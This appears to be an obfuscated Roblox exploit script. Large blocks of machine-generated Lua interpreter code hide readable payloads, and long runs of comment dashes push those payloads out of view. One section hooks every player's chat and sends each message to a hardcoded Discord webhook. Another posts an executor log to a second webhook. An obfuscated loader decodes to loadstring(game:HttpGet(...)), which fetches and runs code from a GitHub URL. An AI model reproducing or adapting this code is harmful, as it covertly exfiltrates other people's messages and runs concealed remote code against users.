(v241==1) then v244=nil;v245=nil;v241=2;end if (v241==0) then v242=0;v243=nil;v241=1;end end end v97[1 + 2]=v29();v211=1;end if (v211==1) then v197=1 -0;break;end end end if (v197~=(270 -(215 + 54))) then else for v225=1,v31() do local v226=0;local v227;local v228;local v229;local v230;local v231;while true do if (v226==1) then v229=nil;v230=nil;v226=2;end if (v226==0) then v227=0;v228=nil;v226=1;end if (v226==2) then v231=nil;while true do if (v227==2) then while true do if ((1218 -(386 + 832))==v228) then local v260=0;local v261;while true do if (v260==0) then v261=0;while true do if (1==v261) then v228=56 -(42 + 13);break;end if (v261==0) then v229=0 -0;v230=nil;v261=1;end end break;end end end if (v228~=1) then else v231=nil;while true do if (v229==(1927 -(447 + 1480))) then local v265=0;while true do if (v265==0) then v230=0;v231=nil;v265=1;end if (v265==1) then v229=317 -(159 + 157);break;end end end if (v229~=1) then else while true do if (v230==(0 + 0)) then v231=v29();if (v28(v231,1 + 0,17 -(12 + 4))~=0) then else local v275=0;local v276;local v277;local v278;local v279;while true do if (v275==0) then v276=0;v277=nil;v275=1;end if (2==v275) then while true do if (v276==0) then local v285=0;local v286;local v287;local v288;while true do if (v285==0) then v286=0;v287=nil;v285=1;end if (v285==1) then v288=nil;while true do if (v286==0) then local v436=0;local v437;while true do if (v436==0) then v437=0;while true do if (v437==1) then v286=1;break;end if (v437==0) then v287=0 -0;v288=nil;v437=1;end end break;end end end if (v286==1) then while true do if (v287~=(934 -(560 + 374))) then else v288=0 -0;while true do if (v288==(596 -(29 + 566))) then v276=138 -(90 + 47);break;end if (v288~=0) then else local v500=0;local v501;while true do if (v500==0) then v501=0;while true do if (v501==1) then v288=1;break;end if (v501==0) then v277=v28(v231,3 -1,1911 -(1412 + 496));v278=v28(v231,4 + 0,6);v501=1;end end break;end end end end break;end end break;end end break;end end end if (v276==(293 -(229 + 62))) then local v289=0;local v290;while true do if (v289==0) then v290=0 + 0;while true do if (v290==(1 + 0)) then v276=1616 -(1434 + 179);break;end if (v290~=(731 -(105 + 626))) then else local v438=0;while true do if (v438==0) then if (v28(v278,1 + 0,603 -(128 + 474))==(2 -1)) then v279[2]=v99[v279[2]];end if (v28(v278,2,2 + 0)~=(1 -0)) then else v279[7 -4]=v99[v279[7 -4]];end v438=1;end if (v438==1) then v290=1335 -(989 + 345);break;end end end end break;end end end if (v276~=3) then else if (v28(v278,3 + 0,1248 -(303 + 942))~=1) then else v279[8 -4]=v99[v279[4]];end v94[v225]=v279;break;end if (v276==1) then local v292=0;local v293;while true do if (v292==0) then v293=0;while true do if (0==v293) then local v439=0;local v440;while true do if (v439==0) then v440=0;while true do if (v440==0) then local v502=0;local v503;while true do if (0==v502) then v503=0;while true do if (v503==0) then local v591=0;while true do if (v591==0) then v279={v30(),v30(),nil,nil};if (v277==(0 -0)) then local v657=0;local v658;local v659;local v660;while true do if (v657==0) then v658=0;v659=nil;v657=1;end if (v657==1) then v660=nil;while true do if (v658==1) then while true do if (v659~=(620 -(221 + 399))) then else v660=0;while true do if (v660==(0 + 0)) then v279[581 -(267 + 311)]=v30();v279[14 -10]=v30();break;end end break;end end break;end if (v658==0) then local v689=0;while true do if (v689==1) then v658=1;break;end if (v689==0) then v659=0;v660=nil;v689=1;end end end end break;end end elseif (v277==(1 -0)) then v279[14 -11]=v31();elseif (v277==2) then v279[7 -4]=v31() -((630 -(131 + 497))^(33 -17));elseif (v277==(1 + 2)) then local v690=0;local v691;local v692;while true do if (v690==1) then while true do if (v691==(0 -0)) then v692=0 + 0;while true do if (v692==(1114 -(299 + 815))) then v279[3]=v31() -(2^(37 -21));v279[4]=v30();break;end end break;end end break;end if (v690==0) then local v724=0;while true do if (v724==0) then v691=0 -0;v692=nil;v724=1;end if (v724==1) then v690=1;break;end end end end end v591=1;end if (v591==1) then v503=1;break;end end end if (v503==1) then v440=1;break;end end break;end end end if (v440==1) then v293=2 -1;break;end end break;end end end if (v293==(4 -3)) then v276=2;break;end end break;end end end end break;end if (1==v275) then v278=nil;v279=nil;v275=2;end end end break;end end break;end end break;end end break;end if (v227==0) then local v249=0;local v250;while true do if (v249==0) then v250=0;while true do if (v250==0) then local v266=0;while true do if (v266==1) then v250=1;break;end if (v266==0) then v228=895 -(760 + 135);v229=nil;v266=1;end end end if (v250==1) then v227=1;break;end end break;end end end if (v227==1) then local v251=0;while true do if (v251==1) then v227=2;break;end if (0==v251) then v230=nil;v231=nil;v251=1;end end end end break;end end end v93=4 -1;break;end end break;end end end if (v93==(2000 -(264 + 1735))) then local v198=0;while true do if (1==v198) then v99={};v93=9 -7;break;end if (v198==0) then v97={v94,v95,nil,v96};v98=v31();v198=1;end end end break;end end break;end end break;end if (v147==0) then local v157=0;while true do if (v157==1) then v147=1;break;end if (v157==0) then v148=0;v149=nil;v157=1;end end end end end break;end if (v92==0) then local v144=0;while true do if (v144==0) then local v151=0;while true do if (v151==1) then v144=1;break;end if (0==v151) then v93=0;v94=nil;v151=1;end end end if (v144==1) then v92=1;break;end end end if (v92==1) then local v145=0;while true do if (v145==1) then v92=2;break;end if (v145==0) then local v152=0;while true do if (v152==1) then v145=1;break;end if (0==v152) then v95=nil;v96=nil;v152=1;end end end end end end break;end if (v91==0) then v92=0;v93=nil;v91=1;end end end v64=1;end end end end end if (v25==1) then local v55=0;while true do if (v55==1) then local v65=0;while true do if (v65==1) then v55=2;break;end if (v65==0) then function v29()local v100=0;local v101;local v102;while true do if (v100==1) then while true do local v126=0;while true do if (v126==0) then if (0==v101) then local v153=0;local v154;while true do if (v153==0) then v154=0;while true do if (v154==0) then local v181=0;while true do if (v181==1) then v154=1;break;end if (v181==0) then v102=v4(v22,v26,v26);v26=v26 + (2 -1);v181=1;end end end if (v154==1) then v101=3 -2;break;end end break;end end end if (v101==1) then return v102;end break;end end end break;end if (0==v100) then local v120=0;local v121;while true do if (v120==0) then v121=0;while true do if (v121==0) then v101=0 + 0;v102=nil;v121=1;end if (v121==1) then v100=1;break;end end break;end end end end end v30=nil;v65=1;end end end if (0==v55) then local v66=0;while true do if (v66==0) then local v88=0;while true do if (v88==0) then function v28(v109,v110,v111)if v111 then local v131=0;local v132;local v133;while true do if (v131==0) then v132=0;v133=nil;v131=1;end if (v131==1) then while true do if (v132==0) then v133=(v109/((3 -1)^(v110-(1 -0))))%((287 -(7 + 278))^(((v111-(1 -0)) -(v110-(1 + 0))) + 1));return v133-(v133%(175 -(161 + 13)));end end break;end end else local v134=0;local v135;local v136;local v137;while true do if (v134==0) then v135=0;v136=nil;v134=1;end if (1==v134) then v137=nil;while true do if (1==v135) then while true do if (v136==0) then local v179=0;while true do if (v179==0) then local v194=0;while true do if (v194==0) then v137=(677 -(460 + (1850 -(1201 + 434))))^(v110-1);return (((v109%(v137 + v137))>=v137) and (1 + 0)) or (1363 -(1160 + 203));end end end end end end break;end if (v135==0) then local v166=0;while true do if (v166==0) then v136=1880 -(1737 + 143);v137=nil;v166=1;end if (v166==1) then v135=1;break;end end end end break;end end end end v29=nil;v88=1;end if (v88==1) then v66=1;break;end end end if (v66==1) then v55=1;break;end end end if (v55==2) then v25=2;break;end end end v45=1;end end end if (v44==1) then if (v25==2) then local v51=0;while true do if (v51==1) then local v56=0;while true do if (v56==1) then v51=2;break;end if (v56==0) then function v31()local v80=0;local v81;local v82;local v83;local v84;local v85;local v86;while true do if (v80==0) then v81=0;v82=nil;v80=1;end if (v80==1) then v83=nil;v84=nil;v80=2;end if (v80==2) then v85=nil;v86=nil;v80=3;end if (v80==3) then while true do if (v81==2) then v86=nil;while true do local v127=0;while true do if (0==v127) then if (v82==(1542 -((2096 -(472 + 384)) + 301))) then return (v86 * (16009252 + 767964)) + (v85 * (114580 -49044)) + (v84 * (932 -676)) + v83;end if (v82==0) then v83,v84,v85,v86=v4(v22,v26,v26 + (4 -1));v26=v26 + 2 + 1 + 1;v82=1497 -(1149 + 347);end break;end end end break;end if (v81==1) then local v122=0;while true do if (v122==1) then v81=2;break;end if (v122==0) then v84=nil;v85=nil;v122=1;end end end if (v81==0) then local v123=0;while true do if (v123==1) then v81=1;break;end if (v123==0) then v82=0 + 0;v83=nil;v123=1;end end end end break;end end end v32=nil;v56=1;end end end if (v51==0) then function v30()local v58=0;local v59;local v60;local v61;local v62;while true do if (v58==1) then v61=nil;v62=nil;v58=2;end if (v58==2) then while true do if (v59==1) then v62=nil;while true do local v107=0;local v108;while true do if (v107==0) then v108=0;while true do if (v108==0) then if (v60==((0 + 0) -(1940 -(641 + 1299)))) then local v155=0;local v156;while true do if (v155==0) then v156=0;while true do if (v156==1) then v60=1458 -(1440 + 17);break;end if (v156==0) then v61,v62=v4(v22,v26,v26 + (1920 -(651 + 1267)));v26=v26 + 1 + 1 + 0;v156=1;end end break;end end end if (1==v60) then return (v62 * (58 + 104 + 94)) + v61;end break;end end break;end end end break;end if (v59==0) then local v103=0;while true do if (v103==0) then v60=0 + 0;v61=nil;v103=1;end if (v103==1) then v59=1;break;end end end end break;end if (v58==0) then v59=0;v60=nil;v58=1;end end end v31=nil;v51=1;end if (v51==2) then v25=3;break;end end end if (v25==0) then local v52=0;local v53;while true do if (v52==0) then v53=0;while true do if (v53==0) then local v67=0;local v68;while true do if (v67==0) then v68=0;while true do if (v68==1) then v53=1;break;end if (v68==0) then v26=1;v27=nil;v68=1;end end break;end end end if (1==v53) then local v69=0;while true do if (v69==0) then v22=v7(v6(v22,5),"..",function(v89)if (v4(v89,2)==79) then local v112=0;local v113;local v114;while true do if (0==v112) then v113=0;v114=nil;v112=1;end if (v112==1) then while true do if (v113==0) then v114=0;while true do if (v114==0) then local v167=0;while true do if (v167==0) then v27=v3(v6(v89,1,1));return "";end end end end break;end end break;end end else local v115=0;local v116;local v117;local v118;local v119;while true do if (v115==0) then v116=0;v117=nil;v115=1;end if (v115==1) then v118=nil;v119=nil;v115=2;end if (v115==2) then while true do if (v116==0) then v117=0;v118=nil;v116=1;end if (v116==1) then v119=nil;while true do if (v117==1) then while true do if (v118==0) then v119=v5(v3(v89,16));if v27 then local v187=0;local v188;local v189;while true do if (0==v187) then local v199=0;while true do if (v199==1) then v187=1;break;end if (v199==0) then v188=0;v189=nil;v199=1;end end end if (v187==1) then while true do if (v188==1) then return v189;end if (v188==0) then local v209=0;local v210;while true do if (v209==0) then v210=0;while true do if (v210==1) then v188=1;break;end if (v210==0) then local v247=0;while true do if (1==v247) then v210=1;break;end if (v247==0) then v189=v8(v119,v27);v27=nil;v247=1;end end end end break;end end end end break;end end else return v119;end break;end end break;end if (v117==0) then local v168=0;local v169;while true do if (v168==0) then v169=0;while true do if (v169==1) then v117=1;break;end if (v169==0) then local v195=0;while true do if (1==v195) then v169=1;break;end if (v195==0) then v118=0;v119=nil;v195=1;end end end end break;end end end end break;end end break;end end end end);v28=nil;v69=1;end if (v69==1) then v53=2;break;end end end if (2==v53) then v25=1;break;end end break;end end end v44=2;end end end break;end if (v24==2) then local v40=0;local v41;while true do if (v40==0) then v41=0;while true do if (v41==0) then v31=nil;v32=nil;v41=1;end if (v41==1) then v33=nil;v24=3;break;end end break;end end end if (v24==3) then local v42=0;while true do if (1==v42) then v36=nil;v24=4;break;end if (v42==0) then v34=nil;v35=nil;v42=1;end end end if (v24==1) then local v43=0;while true do if (v43==1) then v30=nil;v24=2;break;end if (v43==0) then v28=nil;v29=nil;v43=1;end end end end end v20=2;end end end if (v2==1) then local v21=0;while true do if (0==v21) then v7=string.gsub;v8=string.rep;v21=1;end if (v21==2) then v2=2;break;end if (1==v21) then v9=table.concat;v10=table.insert;v21=2;end end end end break;end if (v1==2) then v8=nil;v9=nil;v10=nil;v1=3;end if (v1==3) then v11=nil;v12=nil;v13=nil;v1=4;end end break;end if (v0==3) then v10=nil;v11=nil;v12=nil;v0=4;end if (v0==1) then v4=nil;v5=nil;v6=nil;v0=2;end if (v0==4) then v13=nil;v14=nil;v15=nil;v0=5;end if (v0==0) then v1=0;v2=nil;v3=nil;v0=1;end end end end end
print("YUH")
print("(SA)")
--
--
--
---
---
---

------

----


---------------------
---


------
--


----------------


----------------------------------

-----
-----------
-------------------------


-----------
------------------

-----

----------------------------------------------------------






------------------------------------------------
















---------------------------------------























---------------------------------------









































































































































































































































































































































































































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=0;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;while true do if (v17==3) then function v24()local v38=v23();local v39=v23();return (( -(1 + 1 + 0) * v20(v39,1194 -(931 + 231))) + 1) * ((3 -1)^(v20(v39,12 + (20 -11),1575 -(1308 + 236)) -1023)) * ((((v20(v39,1,1 + 19) * ((2 + (0 -0))^(18 + 14 + 0))) + v38)/((1858 -(1629 + 85 + 142))^(181 -129))) + 1 + 0 + 0);end v25=nil;function v25(v30)local v40=0 + (139 -(98 + 41));local v41;local v42;while true do if (v40==(2 -0)) then v42={};for v69=1 + 0 + 0, #v41 do v42[v69]=v2(v1(v3(v41,v69,v69)));end v40=3 + 0;end if (v40==(0 + 0)) then v41=nil;if  not v30 then local v72=0 + 0;while true do if (0==v72) then v30=v23();if (v30==(569 -(28 + 541))) then return "";end break;end end end v40=1;end if (v40==(1 + 0)) then v41=v3(v15,v18,(v18 + v30) -((843 + 1059) -(1040 + (1375 -514))));v18=v18 + v30;v40=2;end if ((127 -(29 + 29 + 66))==v40) then return v6(v42);end end end v26=v23;v17=4;end if (v17==4) then v27=nil;function v27(...)return {...},v11("#",...);end v28=nil;function v28()local v43=0;local v44;local v45;local v46;local v47;local v48;local v49;local v50;local v51;while true do if (v43~=2) then else v48=nil;v49=nil;v43=3 + 0;end if (v43==(940 -(766 + 171))) then v50=nil;v51=nil;v43=4;end if (0==v43) then v44=760 -(734 + 26);v45=nil;v43=2 -1;end if ((1946 -(1351 + 591))==v43) then while true do if (v44~=2) then else v49=nil;v50=nil;v44=1242 -(682 + 557);end if (v44~=(1691 -(1196 + 494))) then else v47=nil;v48=nil;v44=2 + 0;end if (0==v44) then v45=0;v46=nil;v44=1;end if (3==v44) then v51=nil;while true do local v78=0 + 0;while true do if (v78~=0) then else if ((1 + 0)~=v45) then else local v96=0;while true do if ((1 + 0)==v96) then for v105=1,v50 do local v106=0;local v107;local v108;local v109;local v110;while true do if (v106~=2) then else while true do if (v107==1) then v110=nil;while true do if (v108~=0) then else local v137=1984 -(507 + 1477);while true do if (v137==1) then v108=838 -(129 + 708);break;end if ((0 + 0)==v137) then v109=v21();v110=nil;v137=1;end end end if (v108~=(1192 -(359 + 832))) then else if (v109==1) then v110=v21()~=0;elseif (v109==(1 + 1)) then v110=v24();elseif (v109==3) then v110=v25();end v51[v105]=v110;break;end end break;end if (v107==(0 -0)) then local v135=1887 -(636 + 1251);while true do if (v135~=0) then else v108=1366 -(608 + 758);v109=nil;v135=2 -1;end if (1~=v135) then else v107=1 + 0;break;end end end end break;end if (v106==(1 -0)) then v109=nil;v110=nil;v106=32 -(21 + 9);end if (v106==(1014 -(741 + 273))) then v107=1887 -(448 + 1439);v108=nil;v106=1 + 0;end end end v49[3]=v21();v96=2 -0;end if (v96==(534 -(447 + 87))) then v50=v23();v51={};v96=1960 -(1382 + 577);end if (v96==(2 + 0)) then v45=2;break;end end end if (v45~=0) then else local v97=0;while true do if (v97==(1965 -(1677 + 287))) then v48={};v49={v46,v47,nil,v48};v97=1 + 1;end if (v97~=0) then else v46={};v47={};v97=1;end if (v97==2) then v45=1;break;end end end v78=3 -2;end if (v78~=1) then else if (v45~=(3 -1)) then else local v98=0;local v99;while true do if ((0 -0)==v98) then v99=0 + 0;while true do local v111=0 -0;while true do if (v111~=(0 + 0)) then else if (v99==(1799 -(454 + 1344))) then local v125=0;while true do if (v125~=(0 + 0)) then else for v139=3 -2,v23() do v48[v139]=v23();end return v49;end end end if (v99~=(0 + 0)) then else local v126=62 -(14 + 48);while true do if (v126~=(749 -(605 + 143))) then else v99=1;break;end if ((0 -0)~=v126) then else for v141=845 -(680 + 164),v23() do local v142=0 + 0;local v143;local v144;while true do if (v142==(1455 -(1084 + 370))) then while true do if ((0 + 0)==v143) then v144=v21();if (v20(v144,1 + 0,2 -1)==(953 -(474 + 479))) then local v149=1019 -(388 + 631);local v150;local v151;local v152;local v153;while true do if (v149~=2) then else while true do if (v150==1) then local v154=0 + 0;while true do if ((0 -0)~=v154) then else v153={v22(),v22(),nil,nil};if (v151==(0 -0)) then local v160=0 + 0;while true do if (v160==0) then v153[14 -11]=v22();v153[1469 -(965 + 500)]=v22();break;end end elseif (v151==1) then v153[3]=v23();elseif (v151==2) then v153[3]=v23() -(2^(45 -29));elseif (v151==(4 -1)) then local v165=653 -(529 + 124);local v166;while true do if (0~=v165) then else v166=0;while true do if (v166==0) then v153[3]=v23() -((2 + 0)^16);v153[4]=v22();break;end end break;end end end v154=1 -0;end if (1~=v154) then else v150=1 + 1;break;end end end if (v150==(688 -(297 + 389))) then if (v20(v152,1,323 -(81 + 241))~=(1 + 0)) then else v153[740 -(192 + 546)]=v51[v153[2]];end if (v20(v152,2,2)~=(1 + 0)) then else v153[1160 -(1041 + 116)]=v51[v153[1216 -(919 + 294)]];end v150=3 + 0;end if (v150~=(557 -(215 + 339))) then else if (v20(v152,11 -8,3)==1) then v153[4]=v51[v153[4]];end v46[v141]=v153;break;end if ((0 + 0)~=v150) then else local v156=0 -0;while true do if (v156~=0) then else v151=v20(v144,2,3);v152=v20(v144,1 + 3,783 -(94 + 683));v156=621 -(81 + 539);end if (v156~=1) then else v150=1;break;end end end end break;end if (0==v149) then v150=0 + 0;v151=nil;v149=1 + 0;end if (1==v149) then v152=nil;v153=nil;v149=3 -1;end end end break;end end break;end if (v142==(0 + 0)) then v143=0;v144=nil;v142=1;end end end for v145=3 -2,v23() do v47[v145-1]=v28();end v126=1;end end end break;end end end break;end end end break;end end end break;end end break;end if (v43~=1) then else v46=nil;v47=nil;v43=2;end end end v17=5;end if (v17==1) then function v20(v31,v32,v33)if v33 then local v65=(0 + 0) -0;local v66;while true do if (v65==(0 -0)) then v66=(v31/((5 -3)^(v32-(2 -1))))%((610 -(146 + 462))^(((v33-((766 -(92 + 64)) -(111 + 498))) -(v32-(1 + 0))) + 1));return v66-(v66%(1 -0));end end else local v67=(67 -(47 + 18))^(v32-(1 -(1106 -(543 + 563))));return (((v31%(v67 + v67))>=v67) and (1182 -(473 + 708))) or ((1273 + 489) -(1032 + 730));end end v21=nil;function v21()local v52=539 -(382 + 157);local v53;while true do if (v52==(1 -0)) then return v53;end if (v52==(0 -0)) then v53=v1(v15,v18,v18);v18=v18 + 1 + 0;v52=1585 -(1088 + (773 -277));end end end v22=nil;v17=2;end if (v17==2) then function v22()local v54=0;local v55;local v56;while true do if (v54==(0 -(569 -(215 + 354)))) then v55,v56=v1(v15,v18,v18 + 2 + 0);v18=v18 + 2 + 0;v54=1 + 0;end if (v54==(1 + 0)) then return (v56 * ((1230 -(248 + 12)) -714)) + v55;end end end v23=nil;function v23()local v57,v58,v59,v60=v1(v15,v18,v18 + (1214 -(803 + 408)));v18=v18 + 1 + 3;return (v60 * (83211070 -66433854)) + (v59 * 65536) + (v58 * 256) + v57;end v24=nil;v17=3;end if (v17==0) then v18=1;v19=nil;v15=v4(v3(v15,5),"..",function(v34)if (v1(v34,2)==79) then v19=v0(v3(v34,1,1));return "";else local v68=v2(v0(v34,16));if v19 then local v71=v5(v68,v19);v19=nil;return v71;else return v68;end end end);v20=nil;v17=1;end if (v17==5) then v29=nil;function v29(v35,v36,v37)local v61=0;local v62;local v63;local v64;while true do if (1==v61) then v64=v35[3];return function(...)local v73=1;local v74= -1;local v75={...};local v76=v11("#",...) -1;local function v77()local v79=v62;local v80=Const;local v81=v63;local v82=v64;local v83=v27;local v84={};local v85={};local v86={};for v92=1329 -(54 + 1275),v76 do if (((2958 -(1606 + 122))==(2262 -(983 + 49))) and (v92>=v82)) then v84[v92-v82]=v75[v92 + 1 + 0];else v86[v92]=v75[v92 + (2 -1) + (0 -0)];end end local v87=(v76-v82) + (2 -1);local v88;local v89;while true do local v93=(1790 -(1731 + 59)) -0;while true do if ((v93==0) or (((1448 -(81 + 35)) -(25 + 133 + 815))==(1405 + 2667))) then v88=v79[v73];v89=v88[(477 -(108 + 367)) -1];v93=1 -0;end if ((v93==((1004 -(727 + 276)) + 0)) or ((3016 -(50 + (1568 -(51 + 694))))>=(5194 -(740 + 182)))) then if ((v89<=(1 + 1)) or ((2153 -(528 + 168))<=(1719 -966))) then if (((8563 -(8043 -3785))>=(4293 -((1023 -199) + 417))) and (v89<=(0 -0))) then local v101=0 + 0;local v102;local v103;local v104;while true do if ((v101==(204 -(120 + 84))) or ((2036 -1188)>(12977 -(10664 -(545 + 944))))) then local v122=0 + 0;while true do if ((v122==(0 -0)) or ((18677 -14260)<=(2738 -1577))) then v102=0 + 0;v103=nil;v122=1 + 0;end if (((1708 -(117 + 89 + (8 -3)))>(3844 -2821)) and (v122==(1 + 0))) then v101=(3720 -1781) -(1180 + 55 + 703);break;end end end if ((v101==(1 -(0 + 0))) or ((1985 -(150 + 1350))>=((30271 -17397) -8289))) then v104=nil;while true do if ((v102==(0 -0)) or ((4797 -2488)<(2038 + 149))) then local v127=0 -0;local v128;while true do if (((4839 -(740 + 128))>=(5070 -1522)) and ((0 + 0)==v127)) then v128=(342 + 922) -(99 + (2432 -(33 + 1234)));while true do if ((v128==(1586 -(309 + 1277))) or ((5146 -(28 + 921))<(1126 + 2786))) then local v147=0 + 0;while true do if (((851 + 130 + 160)>=(1272 -(147 + 116 + 222 + 185))) and (v147==((794 -(738 + 56)) + 0))) then v103=v88[644 -((1162 -(695 + 348)) + 523)];v104=v86[v88[10 -7]];v147=1 + 0;end if (((5506 -2161)>(2015 -(1764 -803))) and (v147==(1136 -(1030 + 105)))) then v128=(11 -7) -3;break;end end end if ((v128==((3 -2) + 0)) or (((705 + 1255) -((1737 -(215 + 1474)) + 317))<(4101 -(6005 -2935)))) then v102=796 -(691 + 104);break;end end break;end end end if ((v102==(2 -1)) or ((9481 -5180)<(965 + 1709))) then v86[v103 + 1]=v104;v86[v103]=v104[v88[912 -((55 -20) + (1694 -(312 + 509)))]];break;end end break;end end elseif ((v89>(3 -2)) or ((423 + (454 -266))==(2406 -(258 + 658)))) then v86[v88[(425 -(51 + 369)) -3]]=v37[v88[2 + 1]];else local v113=761 -(558 + 63 + 140);local v114;local v115;while true do if (((300 + 231)<=(4272 -(411 + 1007))) and (v113==((960 -664) -(280 + 16)))) then v114=0 -0;v115=nil;v113=1 + 0;end if (((2380 -((1621 -1225) + 291))>=(2706 -((1749 -1112) + 368 + 626))) and (((903 -(572 + 330)) -0)==v113)) then while true do if ((v114==(0 + (0 -0))) or ((1143 + 2993)<(7365 -4325))) then v115=v88[1877 -(1346 + 529)];v86[v115]=v86[v115](v12(v86,v115 + 1 + 0 + 0,v74));break;end end break;end end end elseif ((v89<=(1 + 3 + 0)) or ((2405 + 381)<=(146 + 322))) then if ((((6236 -3544) -(436 + 1014))==(4752 -3510)) and (v89==(5 -2))) then v86[v88[2]]();else v86[v88[4 -2]]=v88[(3409 -(158 + 1648)) -(186 + 222 + 1192)];end elseif ((v89>(1335 -(1107 + 223))) or ((15378 -10965)<(260 -107))) then do return;end else local v117=1721 -(941 + 780);local v118;local v119;local v120;local v121;while true do if ((v117==(1 + 0)) or ((9180 -5979)>((32179 -17239) -11319))) then local v123=(2977 -2156) -(227 + 594);while true do if ((v123==(0 -0)) or ((637 + 257)<(1811 -1413))) then v74=(v120 + v118) -(1 + 0);v121=0 + 0;v123=1 + (0 -0);end if ((v123==((2045 -951) -((1382 -(334 + 795)) + 840))) or ((3317 -(759 + 114))>(12766 -9544))) then v117=238 -(31 + 205);break;end end end if ((v117==((229 -123) -(72 + 34))) or ((8149 -(356 + 4749))>=(2880 + 217))) then local v124=1511 -(214 + 1297);while true do if (((1 + 8)==(1 + 7 + 1)) and ((1736 -(1337 + 398))==v124)) then v117=1;break;end if ((1602<(8942 -4507)) and (((1343 -(824 + 519)) + (157 -(141 + 16)))==v124)) then v118=v88[1 + 1];v119,v120=v83(v86[v118](v12(v86,v118 + (2 -1),v88[(1353 -(385 + 136)) -(389 + 440)])));v124=(3697 -2058) -(1448 + (717 -(336 + 191)));end end end if ((v117==(1 + 1)) or ((9547 -(565 + 6124))>(10996 -7113))) then for v131=v118,v74 do local v132=(0 -0) -0;local v133;local v134;while true do if (((1 + 0)==v132) or ((1034 + 1835)<=(1206 + 636))) then while true do if ((((2204 -935) + (986 -(204 + 763)))==(931 + 357)) and (v133==(0 -0))) then v134=(2030 -1317) -(630 + 83);while true do if ((v134==((797 -(753 + 44)) + 0)) or ((1018 -(532 -(27 + 14)))>(5712 -(475 + (2025 -1226))))) then v121=v121 + (1683 -(95 + 1387 + 200));v86[v131]=v119[v121];break;end end break;end end break;end if ((v132==(1798 -(914 + 884))) or ((848 + 2692)==(2946 -(279 + 113)))) then v133=0 + 0;v134=nil;v132=1;end end end break;end end end v73=v73 + (902 -(506 + 395));break;end end end end A,B=v27(v10(v77));if  not A[1] then local v90=0;local v91;while true do if (v90==0) then v91=v35[4][v73] or "?";error("Script error at ["   .. v91   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end end;end if (v61==0) then v62=v35[1];v63=v35[2];v61=1;end end end return v29(v28(),{},v16)();end end end v14("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403513O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F53692O6E65727833466C6F72656E6369612F53692O6E65727833466C6F72656E6369612F6D61696E2F6O7700083O0012023O00013O001202000100023O00202O000100010003001204000300044O0005000100034O00015O00022O00033O000100012O00063O00017O00083O00023O00023O00023O00023O00023O00023O00023O00033O00",v8());end


local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'Security Logger';
local Embed = {
    title = 'Executor Log:';
    color = '99999';
    footer = { text = game.JobId };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = '(SA)';
            value = 'Owned By (SA)';
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};


do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=0;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;while true do if (v17==6) then v28=nil;function v28()local v38=0 + 0;local v39;local v40;local v41;local v42;local v43;local v44;local v45;local v46;while true do if (v38~=(1819 -(1654 + 165))) then else v39=0;v40=nil;v38=1;end if (v38~=(1106 -(827 + 275))) then else while true do if (v39==(1 + 1)) then local v77=0 + 0;while true do if (v77~=0) then else v44=nil;v45=nil;v77=1;end if (v77~=(1 + 0)) then else v39=2 + 1;break;end end end if (v39==(3 + 0)) then v46=nil;while true do local v80=0;local v81;while true do if ((0 -0)==v80) then v81=931 -(650 + 281);while true do if (v81==(1792 -(635 + 1156))) then if (v40==3) then for v103=1,v23() do v42[v103-(1 + 0)]=v28();end for v105=2 -1,v23() do v43[v105]=v23();end return v44;end if ((1469 -(496 + 972))==v40) then local v101=106 -(74 + 32);while true do if ((1368 -(1357 + 10))~=v101) then else v46={};v40=1225 -(388 + 835);break;end if (v101~=(0 + 0)) then else v44={v41,v42,nil,v43};v45=v23();v101=1 -0;end end end break;end if ((202 -(61 + 141))==v81) then if (v40==2) then for v107=1 + 0,v45 do local v108=0;local v109;local v110;local v111;while true do if (v108~=(491 -(118 + 373))) then else v109=475 -(298 + 